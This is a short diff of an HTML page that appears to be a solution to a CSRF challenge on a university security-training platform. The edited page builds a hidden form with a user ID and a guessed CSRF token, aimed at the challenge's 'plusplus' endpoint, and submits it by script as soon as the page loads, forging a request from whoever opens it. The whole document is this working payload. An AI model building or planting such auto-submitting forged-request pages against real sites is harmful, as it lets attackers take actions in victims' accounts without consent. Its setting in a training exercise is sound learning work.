@@ -1,21 +1,8 @@
-<form id="form">
+<form id="form" action="https://snickerboa.it.liu.se/user/csrfchallengesix/plusplus">
    <input type="hidden" name="userId" value="86109c9eed773b92480275854966986d3c4901a6">
-   <input type="hidden" name="csrfToken" value="">
-   <input type="submit" value="submit">
+   <input type="hidden" name="csrfToken" value="-16031086592978949996103649412362063995">
 </form>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
-   $('#form').submit(function(){
-       $.ajax({
-         url: "https://snickerboa.it.liu.se/user/csrfchallengesix/plusplus",
-         type: 'POST',
-         crossDomain: true,
-         data : $('#form').serialize(),
-         success: function(response){
-           console.log(response);
-         }
-       });
-       return false;
-   });
+   document.getElementById("form").submit();
 </script>
